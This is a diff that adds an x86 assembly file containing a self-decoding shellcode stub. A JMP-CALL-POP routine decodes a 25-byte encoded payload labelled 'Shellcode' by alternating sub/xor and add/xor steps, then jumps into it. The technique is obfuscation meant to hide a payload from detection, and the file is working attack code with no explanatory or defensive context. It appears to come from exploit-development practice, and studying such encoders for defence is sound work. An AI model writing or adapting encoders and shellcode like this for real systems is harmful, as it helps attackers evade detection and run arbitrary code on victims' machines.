@@ -1,0 +1,40 @@
+
+global _start
+
+section .text
+_start:
+
+ jmp short call_decoder
+
+decoder:
+ pop esi
+ xor ecx, ecx
+
+
+decode:
+    cmp ecx,len
+    je Shellcode
+
+    test cl,0x1
+    jnz odd ;ungerade
+
+    ;even gerade
+    sub byte [esi], 8
+    xor byte [esi],0xdd
+    jmp fork
+
+    odd:
+    add byte [esi], 5
+    xor byte [esi],0xee
+
+    fork:
+    inc esi
+    inc ecx
+    jmp decode
+
+
+call_decoder:
+
+ call decoder
+Shellcode: db 0xf4,0x29,0x95,0x81,0xfa,0xbc,0xb6,0x81,0xbd,0xbc,0xc7,0x82,0xbb,0x62,0x46,0xb9,0x5c,0x07,0x96,0x62,0x44,0x59,0xde,0x1e,0x65
+len equ $-Shellcode
